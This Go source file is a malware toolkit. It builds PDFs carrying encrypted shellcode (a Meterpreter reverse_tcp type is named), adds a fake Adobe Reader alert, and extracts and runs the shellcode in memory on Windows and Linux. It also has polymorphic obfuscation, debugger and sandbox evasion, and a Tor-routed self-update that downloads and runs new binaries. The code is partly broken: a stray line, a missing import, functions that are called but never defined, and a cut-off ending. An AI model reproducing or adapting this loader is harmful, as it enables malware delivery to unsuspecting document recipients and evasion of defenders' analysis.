package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/PuerkitoBio/goquery"
	"github.com/cheggaaa/pb/v3"
	"golang.org/x/crypto/argon2"
	"golang.org/x/net/proxy"
	"golang.org/x/sys/windows"
)

// Configuration structure
type Config struct {
	UpdateURL      string `json:"update_url"`
	PDFMarker      string `json:"pdf_marker"`
	ShellcodeKey   string `json:"shellcode_key"`
	TorProxy       string `json:"tor_proxy"`
	AutoUpdate     bool   `json:"auto_update"`
	UseObfuscation bool   `json:"use_obfuscation"`
	AntiAnalysis   bool   `json:"anti_analysis"`
	MaxRetries     int    `json:"max_retries"`
}

// Shellcode payload structure
type Payload struct {
	Type      string `json:"type"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	Encrypted string `json:"encrypted"`
	Checksum  string `json:"checksum"`
	Timestamp int64  `json:"timestamp"`
}

// Update information
type UpdateInfo struct {
	Version     string   `json:"version"`
	DownloadURL string   `json:"download_url"`
	Checksum    string   `json:"checksum"`
	Changelog   []string `json:"changelog"`
	Critical    bool     `json:"critical"`
	Date        string   `json:"date"`
}

// Constants
const (
	Version          = "1.3.7"
	ConfigFile       = "loader_config.json"
	CacheDir         = ".shellcode_cache"
	UpdateMarker     = "UPDATED_BY_SELF"
	B64Marker        = "B64_ENCRYPTED_SC:"
	HexMarker        = "HEX_ENCRYPTED_SC:"
	PolymorphicCount = 5
)

var (
	config     Config
	httpClient *http.Client
	mutex      sync.Mutex
)

// ==================== INITIALIZATION ====================

func init() {
	// Load configuration
	loadConfig()
	
	// Setup HTTP client with Tor support if configured
	setupHTTPClient()
	
	// Check for updates if enabled
	if config.AutoUpdate {
		go checkForUpdates()
	}
}

func loadConfig() {
	// Default configuration
	config = Config{
		UpdateURL:      "https://your-update-server.com/api/check",
		PDFMarker:      "%%SHELLCODE_PAYLOAD%%",
		ShellcodeKey:   "default-encryption-key-32bytes-long!!",
		TorProxy:       "socks5://127.0.0.1:9050",
		AutoUpdate:     true,
		UseObfuscation: true,
		AntiAnalysis:   true,
		MaxRetries:     3,
	}
	
	// Try to load from file
	if data, err := ioutil.ReadFile(ConfigFile); err == nil {
		json.Unmarshal(data, &config)
	}
	
	// Ensure key is 32 bytes
	if len(config.ShellcodeKey) < 32 {
		config.ShellcodeKey = padKey(config.ShellcodeKey)
	}
}

func setupHTTPClient() {
	if config.TorProxy != "" && strings.HasPrefix(config.TorProxy, "socks5://") {
		dialer, err := proxy.SOCKS5("tcp", strings.TrimPrefix(config.TorProxy, "socks5://"), nil, proxy.Direct)
		if err == nil {
			httpClient = &http.Client{
				Transport: &http.Transport{Dial: dialer.Dial},
				Timeout:   30 * time.Second,
			}
			return
		}
	}
	httpClient = &http.Client{Timeout: 30 * time.Second}
}

// ==================== MAIN FUNCTION ====================



// ==================== PDF PROCESSING ====================

func extractAndExecute(pdfPath string) {
	fmt.Printf("[+] Processing PDF: %s\n", pdfPath)
	
	// Read PDF
	data, err := ioutil.ReadFile(pdfPath)
	if err != nil {
		fmt.Printf("[-] Error reading PDF: %v\n", err)
		return
	}
	
	// Extract payload
	payload, err := extractPayload(data)
	if err != nil {
		fmt.Printf("[-] Error extracting payload: %v\n", err)
		return
	}
	
	fmt.Printf("[+] Payload extracted: %s/%s\n", payload.OS, payload.Arch)
	
	// Check if payload matches current system
	if !checkCompatibility(payload) {
		fmt.Println("[-] Payload not compatible with current system")
		return
	}
	
	// Decrypt shellcode
	shellcode, err := decryptShellcode(payload.Encrypted, config.ShellcodeKey)
	if err != nil {
		fmt.Printf("[-] Error decrypting shellcode: %v\n", err)
		return
	}
	
	// Verify checksum
	if !verifyChecksum(shellcode, payload.Checksum) {
		fmt.Println("[-] Checksum verification failed")
		return
	}
	
	fmt.Printf("[+] Shellcode decrypted: %d bytes\n", len(shellcode))
	
	// Execute
	if err := executeShellcode(shellcode); err != nil {
		fmt.Printf("[-] Error executing shellcode: %v\n", err)
		return
	}
	
	fmt.Println("[+] Shellcode executed successfully")
}

func extractPayload(data []byte) (*Payload, error) {
	// Try multiple extraction methods
	methods := []func([]byte) (*Payload, error){
		extractFromJSON,
		extractFromBase64,
		extractFromHex,
		extractFromStego,
	}
	
	for _, method := range methods {
		if payload, err := method(data); err == nil {
			return payload, nil
		}
	}
	
	return nil, errors.New("no payload found")
}

func extractFromJSON(data []byte) (*Payload, error) {
	// Look for JSON payload
	start := bytes.Index(data, []byte("{"))
	end := bytes.LastIndex(data, []byte("}"))
	
	if start == -1 || end == -1 || end < start {
		return nil, errors.New("no JSON found")
	}
	
	var payload Payload
	if err := json.Unmarshal(data[start:end+1], &payload); err != nil {
		return nil, err
	}
	
	return &payload, nil
}

func extractFromBase64(data []byte) (*Payload, error) {
	// Look for base64 marker
	if idx := bytes.Index(data, []byte(B64Marker)); idx != -1 {
		start := idx + len(B64Marker)
		end := bytes.Index(data[start:], []byte("\n"))
		if end == -1 {
			end = len(data) - start
		}
		
		b64Data := string(data[start : start+end])
		decoded, err := base64.StdEncoding.DecodeString(b64Data)
		if err != nil {
			return nil, err
		}
		
		var payload Payload
		if err := json.Unmarshal(decoded, &payload); err != nil {
			return nil, err
		}
		
		return &payload, nil
	}
	
	return nil, errors.New("no base64 marker found")
}

// ==================== SHELLCODE EXECUTION ====================

func executeShellcode(shellcode []byte) error {
	if config.UseObfuscation {
		shellcode = polymorphicDecode(shellcode)
	}
	
	// OS-specific execution
	switch runtime.GOOS {
	case "windows":
		return executeWindows(shellcode)
	case "linux":
		return executeLinux(shellcode)
	case "darwin":
		return executeDarwin(shellcode)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func executeWindows(shellcode []byte) error {
	// Allocate memory with RWX permissions
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ntdll := windows.NewLazyDLL("ntdll.dll")
	
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	virtualProtect := kernel32.NewProc("VirtualProtect")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	
	// Anti-debugging check
	if isBeingDebugged() {
		return errors.New("debugger detected")
	}
	
	// Allocate memory
	addr, _, err := virtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return err
	}
	
	// Copy shellcode
	_, _, err = rtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if err != nil && err != windows.ERROR_SUCCESS {
		return err
	}
	
	// Change to executable
	var oldProtect uint32
	_, _, err = virtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil && err != windows.ERROR_SUCCESS {
		return err
	}
	
	// Create thread and execute
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	
	thread, _, err := createThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return err
	}
	
	// Wait for thread completion
	waitForSingleObject.Call(thread, 0xFFFFFFFF)
	
	return nil
}

func executeLinux(shellcode []byte) error {
	// Create memory mapping
	execMem, err := syscall.Mmap(
		-1,
		0,
		len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
	)
	if err != nil {
		return err
	}
	defer syscall.Munmap(execMem)
	
	// Copy shellcode
	copy(execMem, shellcode)
	
	// Convert to function and call
	shellcodeFunc := *(*func())(unsafe.Pointer(&execMem))
	
	// Execute in goroutine
	go shellcodeFunc()
	
	return nil
}

// ==================== ENCRYPTION & OBFUSCATION ====================

func encryptShellcode(shellcode []byte, key string) (string, error) {
	// Derive key using Argon2
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}
	
	derivedKey := argon2.IDKey([]byte(key), salt, 1, 64*1024, 4, 32)
	
	// Create AES cipher
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return "", err
	}
	
	// GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	
	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	
	// Encrypt
	ciphertext := gcm.Seal(nonce, nonce, shellcode, nil)
	
	// Combine salt + ciphertext
	combined := append(salt, ciphertext...)
	
	// Return as base64
	return base64.StdEncoding.EncodeToString(combined), nil
}

func decryptShellcode(encrypted string, key string) ([]byte, error) {
	// Decode base64
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return nil, err
	}
	
	if len(data) < 16 {
		return nil, errors.New("invalid encrypted data")
	}
	
	// Extract salt and ciphertext
	salt := data[:16]
	ciphertext := data[16:]
	
	// Derive key
	derivedKey := argon2.IDKey([]byte(key), salt, 1, 64*1024, 4, 32)
	
	// Create cipher
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	// Extract nonce
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}
	
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	
	// Decrypt
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func polymorphicEncode(shellcode []byte) []byte {
	// Multiple encoding layers
	encoded := shellcode
	
	// XOR with random key
	key := byte(time.Now().UnixNano() % 256)
	for i := range encoded {
		encoded[i] ^= key
	}
	
	// Reverse
	for i, j := 0, len(encoded)-1; i < j; i, j = i+1, j-1 {
		encoded[i], encoded[j] = encoded[j], encoded[i]
	}
	
	// Add junk bytes
	junk := make([]byte, len(encoded)/4)
	rand.Read(junk)
	encoded = append(encoded, junk...)
	
	// Compress
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(encoded)
	gz.Close()
	
	return buf.Bytes()
}

func polymorphicDecode(data []byte) []byte {
	// Decompress if needed
	if data[0] == 0x1f && data[1] == 0x8b {
		reader, err := gzip.NewReader(bytes.NewReader(data))
		if err == nil {
			defer reader.Close()
			data, _ = ioutil.ReadAll(reader)
		}
	}
	
	// Remove junk bytes (assuming last 25% are junk)
	cleanLen := len(data) * 3 / 4
	cleanData := data[:cleanLen]
	
	// Reverse back
	for i, j := 0, len(cleanData)-1; i < j; i, j = i+1, j-1 {
		cleanData[i], cleanData[j] = cleanData[j], cleanData[i]
	}
	
	// XOR decode (try keys 0-255)
	for key := 0; key < 256; key++ {
		decoded := make([]byte, len(cleanData))
		for i := range cleanData {
			decoded[i] = cleanData[i] ^ byte(key)
		}
		
		// Check if result looks like shellcode
		if isValidShellcode(decoded) {
			return decoded
		}
	}
	
	return cleanData
}

// ==================== PDF CREATION ====================

func createMaliciousPDF(shellcodeFile, outputPDF, templatePDF string) {
	fmt.Printf("[+] Creating malicious PDF: %s\n", outputPDF)
	
	// Read shellcode
	shellcode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		fmt.Printf("[-] Error reading shellcode: %v\n", err)
		return
	}
	
	// Create payload
	payload := Payload{
		Type:      "windows/x64/meterpreter/reverse_tcp",
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		Timestamp: time.Now().Unix(),
	}
	
	// Encrypt shellcode
	encrypted, err := encryptShellcode(shellcode, config.ShellcodeKey)
	if err != nil {
		fmt.Printf("[-] Error encrypting: %v\n", err)
		return
	}
	payload.Encrypted = encrypted
	
	// Calculate checksum
	payload.Checksum = calculateChecksum(shellcode)
	
	// Convert to JSON
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("[-] Error marshaling payload: %v\n", err)
		return
	}
	
	// Read template
	var pdfData []byte
	if templatePDF != "" {
		pdfData, err = ioutil.ReadFile(templatePDF)
		if err != nil {
			fmt.Printf("[-] Error reading template: %v\n", err)
			return
		}
	} else {
		// Use minimal PDF template
		pdfData = []byte(`%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 25
>>
stream
BT /F1 12 Tf 72 720 Td (Document) Tj ET
endstream
endobj

%% PAYLOAD_PLACEHOLDER %%

xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000054 00000 n
0000000103 00000 n
0000000162 00000 n
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
281
%%EOF`)
	}
	
	// Embed payload
	marker := []byte("%% PAYLOAD_PLACEHOLDER %%")
	payloadComment := []byte(fmt.Sprintf("%s%s\n", B64Marker, base64.StdEncoding.EncodeToString(payloadJSON)))
	pdfData = bytes.Replace(pdfData, marker, payloadComment, 1)
	
	// Add JavaScript trigger (optional)
	if config.UseObfuscation {
		jsCode := `
		/OpenAction <<
		/S /JavaScript
		/JS (
		app.alert({
			cMsg: "This document requires a newer version of Adobe Reader.",
			cTitle: "Adobe Reader",
			nIcon: 3,
			nType: 0
		});
		)
		>>`
		pdfData = bytes.Replace(pdfData, []byte("/Pages 2 0 R"), []byte("/Pages 2 0 R\n"+jsCode), 1)
	}
	
	// Write output
	if err := ioutil.WriteFile(outputPDF, pdfData, 0644); err != nil {
		fmt.Printf("[-] Error writing PDF: %v\n", err)
		return
	}
	
	fmt.Printf("[+] PDF created successfully: %s (%d bytes)\n", outputPDF, len(pdfData))
	fmt.Printf("[+] Payload size: %d bytes (encrypted: %d chars)\n", len(shellcode), len(encrypted))
}

// ==================== UPDATE SYSTEM ====================

func checkForUpdates() {
	mutex.Lock()
	defer mutex.Unlock()
	
	fmt.Println("[+] Checking for updates...")
	
	// Check if already updated recently
	if _, err := os.Stat(UpdateMarker); err == nil {
		os.Remove(UpdateMarker)
		return
	}
	
	// Fetch update info
	updateInfo, err := fetchUpdateInfo()
	if err != nil {
		fmt.Printf("[-] Update check failed: %v\n", err)
		return
	}
	
	if updateInfo == nil || updateInfo.Version == Version {
		fmt.Println("[+] Already up to date")
		return
	}
	
	fmt.Printf("[!] Update available: %s -> %s\n", Version, updateInfo.Version)
	
	if updateInfo.Critical {
		fmt.Println("[!] CRITICAL UPDATE - Applying immediately...")
		applyUpdate(updateInfo)
	}
}

func fetchUpdateInfo() (*UpdateInfo, error) {
	req, err := http.NewRequest("GET", config.UpdateURL, nil)
	if err != nil {
		return nil, err
	}
	
	// Add headers to mimic browser
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Version", Version)
	
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	
	var updateInfo UpdateInfo
	if err := json.NewDecoder(resp.Body).Decode(&updateInfo); err != nil {
		return nil, err
	}
	
	return &updateInfo, nil
}

func applyUpdate(updateInfo *UpdateInfo) {
	fmt.Printf("[+] Downloading update %s...\n", updateInfo.Version)
	
	// Download new version
	resp, err := httpClient.Get(updateInfo.DownloadURL)
	if err != nil {
		fmt.Printf("[-] Download failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	
	// Read update data
	updateData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Read failed: %v\n", err)
		return
	}
	
	// Verify checksum
	if updateInfo.Checksum != "" {
		hash := sha256.Sum256(updateData)
		downloadChecksum := hex.EncodeToString(hash[:])
		if downloadChecksum != updateInfo.Checksum {
			fmt.Println("[-] Checksum mismatch!")
			return
		}
	}
	
	// Create update file
	updateFile := fmt.Sprintf("update_%s.bin", updateInfo.Version)
	if err := ioutil.WriteFile(updateFile, updateData, 0755); err != nil {
		fmt.Printf("[-] Write failed: %v\n", err)
		return
	}
	
	// Create updater script
	createUpdaterScript(updateFile)
	
	fmt.Println("[+] Update ready. Restarting...")
	
	// Mark for update
	ioutil.WriteFile(UpdateMarker, []byte(time.Now().String()), 0644)
	
	// Restart with new version
	restartWithUpdate(updateFile)
}

func createUpdaterScript(updateFile string) {
	var script string
	
	if runtime.GOOS == "windows" {
		script = fmt.Sprintf(`@echo off
timeout /t 2 /nobreak >nul
copy /Y "%s" "loader.exe" >nul
del "%s" >nul
del "%%~f0" >nul
start loader.exe
`, updateFile, updateFile)
		ioutil.WriteFile("update.bat", []byte(script), 0755)
	} else {
		script = fmt.Sprintf(`#!/bin/bash
sleep 2
cp "%s" loader
rm "%s"
rm "$0"
chmod +x loader
./loader &
`, updateFile, updateFile)
		ioutil.WriteFile("update.sh", []byte(script), 0755)
		os.Chmod("update.sh", 0755)
	}
}

func restartWithUpdate(updateFile string) {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", "update.bat")
	} else {
		cmd = exec.Command("bash", "update.sh")
	}
	
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	
	if err := cmd.Start(); err != nil {
		fmt.Printf("[-] Failed to restart: %v\n", err)
		return
	}
	
	os.Exit(0)
}

func forceUpdate() {
	fmt.Println("[+] Forcing update check...")
	
	updateInfo, err := fetchUpdateInfo()
	if err != nil {
		fmt.Printf("[-] Update failed: %v\n", err)
		return
	}
	
	if updateInfo.Version == Version {
		fmt.Println("[+] Already on latest version")
		return
	}
	
	applyUpdate(updateInfo)
}

// ==================== UTILITIES ====================

func antiAnalysisChecks() bool {
	if !config.AntiAnalysis {
		return true
	}
	
	checks := []func() bool{
		checkDebugger,
		checkSandbox,
		checkVM,
		checkAnalysisTools,
		checkRuntime,
	}
	
	for _, check := range checks {
		if !check() {
			return false
		}
	}
	
	return true
}

func checkDebugger() bool {
	// Windows debugger check
	if runtime.GOOS == "windows" {
		kernel32 := windows.NewLazyDLL("kernel32.dll")
		isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
		ret, _, _ := isDebuggerPresent.Call()
		return ret == 0
	}
	
	// Linux debugger check
	if _, err := os.Stat("/proc/self/status"); err == nil {
		data, err := ioutil.ReadFile("/proc/self/status")
		if err == nil {
			if strings.Contains(string(data), "TracerPid:\t0") {
				return true
			}
		}
	}
	
	return true
}

func checkSandbox() bool {
	// Check for sandbox artifacts
	sandboxFiles := []string{
		"C:\\analysis", "/opt/cuckoo", "/var/lib/virustotal",
		"/usr/local/share/bochs", "/tmp/vbox",
	}
	
	for _, file := range sandboxFiles {
		if _, err := os.Stat(file); err == nil {
			return false
		}
	}
	
	// Check for low resources (sandbox often has limited RAM)
	if runtime.GOOS == "windows" {
		var memStatus windows.MemoryStatusEx
		memStatus.Length = uint32(unsafe.Sizeof(memStatus))
		kernel32 := windows.NewLazyDLL("kernel32.dll")
		globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
		ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))
		if ret != 0 && memStatus.TotalPhys < 2*1024*1024*1024 { // Less than 2GB RAM
			return false
		}
	}
	
	return true
}

func scanPDF(pdfPath string) {
	fmt.Printf("[+] Scanning PDF: %s\n", pdfPath)
	
	data, err := ioutil.ReadFile(pdfPath)
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	
	// Check for various indicators
	indicators := map[string]string{
		"/JS":              "JavaScript",
		"/JavaScript":      "JavaScript",
		"/OpenAction":      "Auto-execution",
		"/AA":              "Additional Actions",
		"/Launch":          "File Launch",
		"/EmbeddedFile":    "Embedded File",
		"/RichMedia":       "Rich Media",
		"/SubmitForm":      "Form Submission",
		"/GoTo":            "Navigation",
		"/URI":             "URL Launch",
		"/AcroForm":        "Form",
		"/XFA":             "XML Forms",
		"/ObjStm":          "Object Stream",
	}
	
	var findings []string
	
	for pattern, description := range indicators {
		if bytes.Contains(data, []byte(pattern)) {
			findings = append(findings, description)
		}
	}
	
	// Check for shellcode markers
	if bytes.Contains(data, []byte(B64Marker)) || bytes.Contains(data, []byte(HexMarker)) {
		findings = append(findings, "Shellcode Payload")
	}
	
	// Check file structure
	if bytes.Contains(data, []byte("%PDF")) && bytes.Contains(data, []byte("%%EOF")) {
		findings = append(findings, "Valid PDF Structure")
	} else {
		findings = append(findings, "INVALID PDF STRUCTURE")
	}
	
	// Print results
	fmt.Printf("[+] File Size: %d bytes\n", len(data))
	fmt.Printf("[+] Findings (%d):\n", len(findings))
	for _, finding := range findings {
		fmt.Printf("  • %s\n", finding)
	}
}

f

// ==================== HELPER FUNCTIONS ====================

func padKey(key string) string {
	if len(key) >= 32 {
		return key[:32]
	}
	padded := key
	for len(padded) < 32 {
		padded += key
	}
	return padded[:32]
}

func calculateChecksum(data []byte) string {
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])
}

func verifyChecksum(data []byte, expected string) bool {
	return calculateChecksum(data) == expected
}

func isValidShellcode(data []byte) bool {
	if len(data) < 4 {
		return false
	}
	
	// Check for common shellcode patterns
	commonPrefixes := [][]byte{
		{0xfc, 0x48}, {0x48, 0x83}, {0x55, 0x48}, {0xe8, 0x00},
		{0x6a, 0x00}, {0x68, 0x00}, {0xb8, 0x00},
	}
	
	for _, prefix := range commonPrefixes {
		if bytes.HasPrefix(data, prefix) {
			return true
		}
	}
	
	return false
}

func checkCompatibility(payload *Payload) bool {
	// Simple compatibility check
	if payload.OS != "" && payload.OS != runtime.GOOS {
		return false
	}
	if payload.Arch != "" && payload.Arch != runtime.GOARCH {
		return false
	}
	return true
}

func cleanCache() {
	os.RemoveAll(CacheDir)
	fmt.Println("[+] Cache cleaned")
}

func listPayloads() {
    fmt.Println("[+] Listing cached payloads:")
    fmt.Println("===============================")
    
    // Create cache directory if it doesn't exist
    if err := os.MkdirAll(CacheDir, 0755); err != nil {
        fmt.Printf("[-] Error creating cache dir: %v\n", err)
        return
    }
    
    // Get all JSON files in cache directory
    files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
    if err != nil {
        fmt.Printf("[-] Error reading cache: %v\n", err)
        return
    }
    
    if len(files) == 0 {
        fmt.Println("[!] No cached payloads found")
        return
    }
    
    // Display payload information
    for i, file := range files {
        data, err := ioutil.ReadFile(file)
        if err != nil {
            fmt.Printf("[-] Error reading %s: %v\n", file, err)
            continue
        }
        
        var payload Payload
        if err := json.Unmarshal(data, &payload); err != nil {
            fmt.Printf("[-] Error parsing %s: %v\n", file, err)
            continue
        }
        
        // Get file info
        info, _ := os.Stat(file)
        shellcodeFile := strings.TrimSuffix(file, ".json") + ".bin"
        shellcodeSize := "N/A"
        if scInfo, err := os.Stat(shellcodeFile); err == nil {
            shellcodeSize = fmt.Sprintf("%d bytes", scInfo.Size())
        }
        
        // Display payload info
        fmt.Printf("\n[%d] %s\n", i+1, filepath.Base(file))
        fmt.Printf("    Type:      %s\n", payload.Type)
        fmt.Printf("    OS/Arch:   %s/%s\n", payload.OS, payload.Arch)
        fmt.Printf("    Timestamp: %s\n", time.Unix(payload.Timestamp, 0).Format("2006-01-02 15:04:05"))
        fmt.Printf("    Checksum:  %s\n", payload.Checksum)
        fmt.Printf("    Size:      %s\n", shellcodeSize)
        fmt.Printf("    Modified:  %s\n", info.ModTime().Format("2006-01-02 15:04:05"))
        
        // Calculate age
        age := time.Since(info.ModTime())
        if age.Hours() < 24 {
            fmt.Printf("    Age:       %.1f hours ago\n", age.Hours())
        } else {
            fmt.Printf("    Age:       %.1f days ago\n", age.Hours()/24)
        }
    }
    
    fmt.Println("\n===============================")
    fmt.Printf("Total payloads: %d\n", len(files))
    
    // Show cache statistics
    showCacheStats()
}

func showCacheStats() {
    var totalSize int64
    var oldest, newest time.Time
    var oldestFile, newestFile string
    
    files, _ := filepath.Glob(filepath.Join(CacheDir, "*"))
    
    for i, file := range files {
        info, err := os.Stat(file)
        if err != nil {
            continue
        }
        
        totalSize += info.Size()
        
        if i == 0 {
            oldest = info.ModTime()
            newest = info.ModTime()
            oldestFile = file
            newestFile = file
        } else {
            if info.ModTime().Before(oldest) {
                oldest = info.ModTime()
                oldestFile = file
            }
            if info.ModTime().After(newest) {
                newest = info.ModTime()
                newestFile = file
            }
        }
    }
    
    fmt.Printf("Cache size:    %s\n", formatBytes(totalSize))
    if len(files) > 0 {
        fmt.Printf("Oldest:        %s (%s)\n", 
            filepath.Base(oldestFile), 
            time.Since(oldest).Round(time.Hour))
        fmt.Printf("Newest:        %s (%s)\n", 
            filepath.Base(newestFile), 
            time.Since(newest).Round(time.Minute))
    }
}

func formatBytes(bytes int64) string {
    const unit = 1024
    if bytes < unit {
        return fmt.Sprintf("%d B", bytes)
    }
    div, exp := int64(unit), 0
    for n := bytes / unit; n >= unit; n /= unit {
        div *= unit
        exp++
    }
    return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

// Additional functions for payload management

func cachePayload(payload *Payload, shellcode []byte) error {
    // Create cache directory if it doesn't exist
    if err := os.MkdirAll(CacheDir, 0755); err != nil {
        return err
    }
    
    // Generate unique filename based on checksum and timestamp
    filename := fmt.Sprintf("payload_%s_%d", payload.Checksum[:8], payload.Timestamp)
    jsonFile := filepath.Join(CacheDir, filename+".json")
    binFile := filepath.Join(CacheDir, filename+".bin")
    
    // Save payload metadata
    payloadJSON, err := json.MarshalIndent(payload, "", "  ")
    if err != nil {
        return err
    }
    
    if err := ioutil.WriteFile(jsonFile, payloadJSON, 0644); err != nil {
        return err
    }
    
    // Save shellcode
    if err := ioutil.WriteFile(binFile, shellcode, 0644); err != nil {
        // Clean up JSON file if shellcode save fails
        os.Remove(jsonFile)
        return err
    }
    
    fmt.Printf("[+] Payload cached: %s\n", filename)
    return nil
}

func loadCachedPayload(checksum string) (*Payload, []byte, error) {
    files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
    if err != nil {
        return nil, nil, err
    }
    
    for _, file := range files {
        data, err := ioutil.ReadFile(file)
        if err != nil {
            continue
        }
        
        var payload Payload
        if err := json.Unmarshal(data, &payload); err != nil {
            continue
        }
        
        if payload.Checksum == checksum {
            // Load corresponding shellcode
            binFile := strings.TrimSuffix(file, ".json") + ".bin"
            shellcode, err := ioutil.ReadFile(binFile)
            if err != nil {
                return nil, nil, err
            }
            return &payload, shellcode, nil
        }
    }
    
    return nil, nil, fmt.Errorf("payload not found in cache")
}

func deleteCachedPayload(checksum string) error {
    files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
    if err != nil {
        return err
    }
    
    for _, file := range files {
        data, err := ioutil.ReadFile(file)
        if err != nil {
            continue
        }
        
        var payload Payload
        if err := json.Unmarshal(data, &payload); err != nil {
            continue
        }
        
        if payload.Checksum == checksum {
            // Delete both JSON and binary files
            binFile := strings.TrimSuffix(file, ".json") + ".bin"
            
            if err := os.Remove(file); err != nil {
                return err
            }
            if err := os.Remove(binFile); err != nil && !os.IsNotExist(err) {
                return err
            }
            
            fmt.Printf("[+] Deleted cached payload: %s\n", payload.Checksum[:8])
            return nil
        }
    }
    
    return fmt.Errorf("payload not found")
}

func cleanOldPayloads(maxAgeDays int) error {
    files, err := filepath.Glob(filepath.Join(CacheDir, "*"))
    if err != nil {
        return err
    }
    
    cutoff := time.Now().AddDate(0, 0, -maxAgeDays)
    var deleted int
    
    for _, file := range files {
        info, err := os.Stat(file)
        if err != nil {
            continue
        }
        
        if info.ModTime().Before(cutoff) {
            if err := os.Remove(file); err == nil {
                deleted++
            }
        }
    }
    
    if deleted > 0 {
        fmt.Printf("[+] Cleaned %d old payloads\n", deleted)
    }
    
    return nil
}

// Interactive payload management
func interactivePayloadManagement() {
    scanner := bufio.NewScanner(os.Stdin)
    
    for {
        fmt.Println("\n[+] Payload Management Menu:")
        fmt.Println("  1. List all payloads")
        fmt.Println("  2. View payload details")
        fmt.Println("  3. Delete payload")
        fmt.Println("  4. Export payload")
        fmt.Println("  5. Clean old payloads (30+ days)")
        fmt.Println("  6. Clear all cached payloads")
        fmt.Println("  7. Back to main menu")
        fmt.Print("\nSelect option: ")
        
        scanner.Scan()
        choice := scanner.Text()
        
        switch choice {
        case "1":
            listPayloads()
        case "2":
            viewPayloadDetails(scanner)
        case "3":
            deletePayloadInteractive(scanner)
        case "4":
            exportPayload(scanner)
        case "5":
            cleanOldPayloads(30)
        case "6":
            clearAllPayloads(scanner)
        case "7":
            return
        default:
            fmt.Println("[-] Invalid choice")
        }
    }
}

func viewPayloadDetails(scanner *bufio.Scanner) {
    fmt.Print("Enter payload checksum (or partial): ")
    scanner.Scan()
    search := scanner.Text()
    
    files, err := filepath.Glob(filepath.Join(CacheDir, "*.json"))
    if err != nil {
        fmt.Printf("[-] Error: %v\n", err)
        return
    }
    
    var matches []string
    for _, file := range files {
        if strings.Contains(file, search) {
            matches = append(matches, file)
        }
    }
    
    if len(matches) == 0 {
        fmt.Println("[-] No matching payloads found")
        return
    }
    
    if len(matches) == 1 {
        displayFullPayloadDetails(matches[0])
    } else {
        fmt.Println("\n[+] Multiple matches found:")
        for i, file := range matches {
            data, _ := ioutil.ReadFile(file)
            var payload Payload
            json.Unmarshal(data, &payload)
            fmt.Printf("  %d. %s (%s/%s)\n", 
                i+1, payload.Checksum[:12], payload.OS, payload.Arch)
        }
